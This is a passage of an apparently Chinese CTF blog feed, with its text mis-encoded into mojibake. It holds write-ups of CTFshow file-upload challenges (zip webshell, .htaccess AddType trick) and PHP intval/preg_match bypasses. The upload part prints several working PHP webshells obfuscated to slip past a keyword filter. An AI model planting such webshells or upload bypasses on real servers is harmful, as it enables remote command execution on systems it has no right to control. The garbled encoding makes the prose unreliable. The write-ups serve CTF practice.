function">strlen</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'End Of File'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token variable">$short</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">order</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$short</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$short</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$short</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$short</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$short</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$short</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">return</span> <span class="token variable">$short</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">eof</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token class-name">binData</span><span class="token operator">||</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>æ‰¾äº†å¥½ä¹…æ‰æ‰¾åˆ°å¯ä»¥é€šè¿‡çš„é©¬</p><p><strong>æ¸²æŸ“å‰</strong></p><p><img src="3_first.jpg" loading="lazy"><em>æ¸²æŸ“å‰</em></p><p><strong>æ¸²æŸ“å</strong></p><p><img src="3_second.jpg" loading="lazy"><em>æ¸²æŸ“å</em></p><p><img src="web165.png" alt="image-20240702212536949" loading="lazy"></p><h4 id="web166-zipè¿½åŠ é©¬"><a href="#web166-zipè¿½åŠ é©¬" class="headerlink" title="web166(zipè¿½åŠ é©¬)"></a>web166(zipè¿½åŠ é©¬)</h4><p>åªå…è®¸ä¸Šä¼ zipæ–‡ä»¶ï¼Œéšä¾¿ä¸Šä¼ ä¸€ä¸ªï¼Œç„¶åå†…å®¹æ”¹ä¸ºä¸€å¥è¯æœ¨é©¬å³å¯ï¼Œæˆ‘åœ¨ä¸Šä¼ æ—¶ï¼Œè¿˜æœ‰MIMEæ£€æµ‹æ‰€ä»¥ä¹Ÿéœ€è¦æ”¹</p><p><code>Content-Type=appliaction/x-zip-compressed</code></p><p><img src="web166.png" loading="lazy"></p><p>æœ€åç‚¹å‡»ä¸‹è½½æ–‡ä»¶ï¼ŒæŠ“åŒ…åå‘èµ·POSTè¯·æ±‚å¾—åˆ°flag</p><p><img src="web166_2.png" loading="lazy"></p><h4 id="web167-htaccess"><a href="#web167-htaccess" class="headerlink" title="web167(.htaccess)"></a>web167(.htaccess)</h4><p>é‚£åº”è¯¥å’Œapacheæœ‰å…³ï¼Œä¸»è¦åˆ©ç”¨.htaccessè¿›è¡Œç»•è¿‡äº†</p><p><strong>.htaccessæ–‡ä»¶</strong></p><blockquote><p>htaccess åœ¨ç«™ç‚¹çš„æ ¹ç›®å½•ä¸‹é¢ï¼Œä¸æ˜¯åœ¨apacheç›®å½•ä¸‹ï¼Œä½†æ˜¯å®ƒå±äºapacheçš„ä¸€ä¸ªé…ç½®æ–‡ä»¶</p></blockquote><blockquote><p>htaccessæ–‡ä»¶æ—¶ApacheæœåŠ¡ä¸­çš„ä¸€ä¸ªé…ç½®æ–‡ä»¶ï¼Œå®ƒè´Ÿè´£ç›¸å…³ç›®å½•ä¸‹çš„ç½‘é¡µé…ç½®ã€‚é€šè¿‡htaccessæ–‡ä»¶ï¼Œå¯ä»¥å¸®åŠ©æˆ‘ä»¬å®ç°ï¼šç½‘é¡µ301</p><p>é‡å®šå‘ã€è‡ªå®šä¹‰404é”™è¯¯é¡µé¢ï¼Œæ”¹å˜æ–‡ä»¶æ‰©å±•åã€å…è®¸&#x2F;é˜»æ­¢ç‰¹å®šçš„ç”¨æˆ·æˆ–è€…ç›®å½•çš„è®¿é—®ï¼Œç¦æ­¢ç›®å½•åˆ—è¡¨ï¼Œé…ç½®é»˜è®¤æ–‡æ¡£ç­‰åŠŸèƒ½</p></blockquote><blockquote><p>å…¶ä¸­.htaccessæ–‡ä»¶å†…å®¹ï¼šSetHandler application&#x2F;x-http-phpçš„æ„æ€æ˜¯è®¾ç½®å½“å‰ç›®å½•æ‰€æœ‰æ–‡ä»¶éƒ½ä½¿ç”¨phpè§£æï¼Œé‚£ä¹ˆæ— è®ºä¸Šä¼ ä»»ä½•æ–‡</p><p>ä»¶ï¼Œåªè¦ç¬¦åˆphpè¯­è¨€ä»£ç è§„èŒƒï¼Œå°±ä¼šè¢«å½“åšPHPæ‰§è¡Œã€‚ä¸ç¬¦åˆè§„åˆ™åˆ™æŠ¥é”™</p></blockquote><p>é¦–å…ˆä¸Šä¼ .htaccess</p><p><code>AddType application/x-httpd-php .jpg</code> &#x2F;&#x2F;å°†.jpgåç¼€çš„æ–‡ä»¶è§£ææˆphp</p><p>ç„¶åå†ä¸Šä¼ 1.jpgï¼Œé‡Œé¢åŠ ä¸Šé©¬çš„å†…å®¹ï¼Œä¹‹åç›´æ¥è®¿é—®xxx&#x2F;upload&#x2F;1.jpgå³å¯</p><h4 id="web168-åé—¨å…æ€"><a href="#web168-åé—¨å…æ€" class="headerlink" title="web168(åé—¨å…æ€)"></a>web168(åé—¨å…æ€)</h4><p><strong>åŸºç¡€å…æ€</strong></p><p>æµ‹è¯•ï¼Œä¼šæ£€æµ‹<code>_GET</code>ã€<code>_POST</code>ã€‚</p><p>å¯æŠ“åŒ…åä¿®æ”¹ç›´æ¥ä¸Šä¼ phpæ–‡ä»¶ã€‚</p><p><strong>åå¼•å·</strong></p><p>åå¼•å·è¾¾åˆ°å‘½ä»¤æ‰§è¡Œçš„æ•ˆæœã€‚</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token string backtick-quoted-string">`whoami`</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$_</span><span class="token punctuation">;</span><span class="token comment">// &lt;?= `whoami`</span><span class="token delimiter important">?></span></span></code></pre><p>æŠŠæºç æ‹”ä¸‹æ¥</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-10-24 19:34:52# @Last Modified by:   h1xa# @Last Modified time: 2020-10-30 00:11:17# @email: h1xa@ctfer.com# @link: https://ctfer.com*/</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"error"</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$ret</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"code"</span><span class="token operator">=></span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"msg"</span><span class="token operator">=></span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"error"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$filesize</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"size"</span><span class="token punctuation">]</span> <span class="token operator">/</span> <span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$filesize</span><span class="token operator">></span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$ret</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"code"</span><span class="token operator">=></span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"msg"</span><span class="token operator">=></span><span class="token string double-quoted-string">"æ–‡ä»¶è¶…è¿‡1024KB"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'type'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'image/png'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">check</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'./upload/'</span><span class="token operator">.</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$ret</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"code"</span><span class="token operator">=></span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"msg"</span><span class="token operator">=></span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token variable">$ret</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"code"</span><span class="token operator">=></span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"msg"</span><span class="token operator">=></span><span class="token string double-quoted-string">"æ–‡ä»¶ç±»å‹ä¸åˆè§„"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">check</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/eval|assert|assert|_POST|_GET|_COOKIE|system|shell_exec|include|require/i'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p>æœ¬æ¥è¿˜æƒ³ç€åŒ…å«ä¸€æ³¢æ—¥å¿—ã€‚</p><p><strong>å­—ç¬¦æ‹¼æ¥</strong></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token variable">$a</span><span class="token operator">=</span><span class="token string single-quoted-string">'syste'</span><span class="token operator">.</span><span class="token string single-quoted-string">'m'</span><span class="token punctuation">;</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'ls ../'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p><strong>$_REQUEST</strong></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">=</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p><strong>æ•°å­¦å‡½æ•°</strong></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$pi</span><span class="token operator">=</span><span class="token function">base_convert</span><span class="token punctuation">(</span><span class="token number">37907361743</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">36</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">dechex</span><span class="token punctuation">(</span><span class="token number">1598506324</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">(</span><span class="token variable">$$pi</span><span class="token punctuation">&#123;</span>abs<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token variable">$$pi</span><span class="token punctuation">&#123;</span>acos<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment"># getä¼ å‚   abs=system&amp;acos=ls</span></span></code></pre><p><a href="https://yanmie-art.github.io/2020/10/30/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6web%E4%B9%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">è¿™é‡Œ</a></p><p><strong>å…¶ä»–å‡½æ•°æ„é€ </strong></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"s#y#s#t#e#m"</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"#"</span><span class="token punctuation">,</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$b</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$b</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$b</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$b</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$b</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$b</span><span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'1s'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'ystem'</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token function">strrev</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'metsys'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><h4 id="web169"><a href="#web169" class="headerlink" title="web169"></a>web169</h4><p>æ—¥å¿—åŒ…å«</p><p>ä¸è¿‡index.phpéœ€è¦è‡ªå·±ä¸Šä¼ </p><h4 id="web170"><a href="#web170" class="headerlink" title="web170"></a>web170</h4><p>åŒ169</p>]]></content>
      
      
      <categories>
          
          <category> å®‰å…¨ç›¸å…³ </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFshow </tag>
            
            <tag> æ–‡ä»¶ä¸Šä¼  </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>webå…¥é—¨-php</title>
      <link href="/2024/06/29/web%E5%85%A5%E9%97%A8-php/"/>
      <url>/2024/06/29/web%E5%85%A5%E9%97%A8-php/</url>
      
        <content type="html"><![CDATA[<h4 id="web89-æ•°ç»„ç»•è¿‡"><a href="#web89-æ•°ç»„ç»•è¿‡" class="headerlink" title="web89(æ•°ç»„ç»•è¿‡)"></a>web89(æ•°ç»„ç»•è¿‡)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$num</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[0-9]/"</span><span class="token punctuation">,</span> <span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no no no!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>åˆ†æä¸Šé¢çš„ä»£ç å¯ä»¥çœ‹å‡ºï¼Œæ­£åˆ™åŒ¹é…0-9ï¼ŒåŒ¹é…åˆ°åˆ™è¿”å›trueï¼Œç›´æ¥dieï¼Œä½†æ˜¯ç”±äºpreg_match()åªèƒ½å¤„ç†å­—ç¬¦ä¸²ï¼Œå½“ä¼ å…¥çš„æ˜¯æ•°ç»„æ—¶å°†ä¼šè¿”å›false,ä»è€Œç»•è¿‡æ­»äº¡å‡½æ•°ã€‚</p><p>**intval()<strong>å‡½æ•°ç”¨äºè·å–å˜é‡çš„æ•´æ•°å€¼ã€‚</strong>intval()**å‡½æ•°é€šè¿‡ä½¿ç”¨æŒ‡å®šçš„è¿›åˆ¶ base è½¬æ¢ï¼ˆé»˜è®¤æ˜¯åè¿›åˆ¶ï¼‰ï¼Œè¿”å›å˜é‡varçš„ integer æ•°å€¼ã€‚ intval() ä¸èƒ½ç”¨äº objectï¼Œå¦åˆ™ä¼šäº§ç”Ÿ E_NOTICE é”™è¯¯å¹¶è¿”å› 1ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå½“ç»™intval()å‡½æ•°ä¼ å…¥ä¸€ä¸ªéç©ºçš„æ•°ç»„æ—¶ï¼Œintval()å‡½æ•°å°†ä¼šè¿”å›1ï¼Œç»“åˆæˆ‘ä»¬preg_match()ä¼ å…¥æ•°ç»„è¿”å›falseçš„ç‰¹æ€§ï¼Œè¿™é“é¢˜çš„payloadå°±å¾ˆæ¸…æ¥šäº†ã€‚</p><p>Payload:<code>?num[]=1</code></p><h4 id="web90-intval"><a href="#web90-intval" class="headerlink" title="web90(intval)"></a>web90(intval)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$num</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token operator">===</span><span class="token string double-quoted-string">"4476"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no no no!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token number">4476</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span></code></pre><p>intval($var,$base)ï¼Œå…¶ä¸­varå¿…å¡«ï¼Œbaseå¯é€‰ï¼Œè¿™é‡Œbase&#x3D;0,åˆ™è¡¨ç¤ºæ ¹æ®varå¼€å§‹çš„æ•°å­—å†³å®šä½¿ç”¨çš„è¿›åˆ¶ï¼š 0xæˆ–0Xå¼€å¤´ä½¿ç”¨åå…­è¿›åˆ¶ï¼Œ0å¼€å¤´ä½¿ç”¨å…«è¿›åˆ¶ï¼Œå¦åˆ™ä½¿ç”¨åè¿›åˆ¶ã€‚</p><p>è¿™é‡Œ&#x3D;&#x3D;&#x3D;è¡¨ç¤ºç±»å‹å’Œæ•°å€¼å¿…é¡»ç›¸ç­‰ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨4476çš„å…«è¿›åˆ¶æˆ–åå…­è¿›åˆ¶ç»•è¿‡æ£€æµ‹ã€‚</p><p>Paylodï¼š</p><blockquote><p>num&#x3D;010574</p><p>num&#x3D;0x117c</p></blockquote><p>intval() è¿˜æœ‰ä¸€ä¸ªç‰¹æ€§ã€‚è¾“å…¥çš„å€¼å¦‚æœæ˜¯å­—ç¬¦ä¸²ï¼Œå®ƒè¿”å›çš„å†…å®¹å–å†³äºç¬¬ä¸€ä¸ªå­—ç¬¦å·¦ä¾§çš„æ•°å­—ã€‚å¦‚ intval(â€˜11a22â€™)&#x3D;11ã€‚</p><blockquote><p>num&#x3D;4476a</p><p>num&#x3D;+4476</p><p>â€¦</p></blockquote><p>æ ¹æ®ä»¥ä¸‹è§£é‡Šï¼Œå¯ä»¥ä¼ å…¥ä¸€ä¸ªæ•°ç»„æ¥ç»•è¿‡ä¸å«æ•°å­—è€Œä¸”intvalå–æ•´æ•°</p><p><a href="https://www.nssctf.cn/problem/2076">[NSSCTF 2022 Spring Recruit]babyphp</a></p><pre class="language-none"><code class="language-none">é€šè¿‡ä½¿ç”¨æŒ‡å®šçš„è¿›åˆ¶ base è½¬æ¢ï¼ˆé»˜è®¤æ˜¯åè¿›åˆ¶ï¼‰ï¼Œè¿”å›å˜é‡ value çš„ int æ•°å€¼ã€‚ intval() ä¸èƒ½ç”¨äº objectï¼Œå¦åˆ™ä¼šäº§ç”Ÿ E_WARNING é”™è¯¯å¹¶è¿”å› 1ã€‚ echo intval(array());                 &#x2F;&#x2F; 0echo intval(array(&#39;foo&#39;, &#39;bar&#39;));     &#x2F;&#x2F; 1</code></pre><h4 id="web91-preg-match-m"><a href="#web91-preg-match-m" class="headerlink" title="web91(preg_match  &#x2F;m)"></a>web91(preg_match  &#x2F;m)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^php$/im'</span><span class="token punctuation">,</span> <span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^php$/i'</span><span class="token punctuation">,</span> <span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'hacker'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'nonononono'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> </code></pre><p><a href="https://blog.csdn.net/qq_46091464/article/details/108278486">Apache HTTPD æ¢è¡Œè§£ææ¼æ´(CVE-2017-15715)ä¸æ‹“å±•</a></p><p>è€ƒå¯Ÿäº†preg_matchçš„&#x2F;mæ¨¡å¼  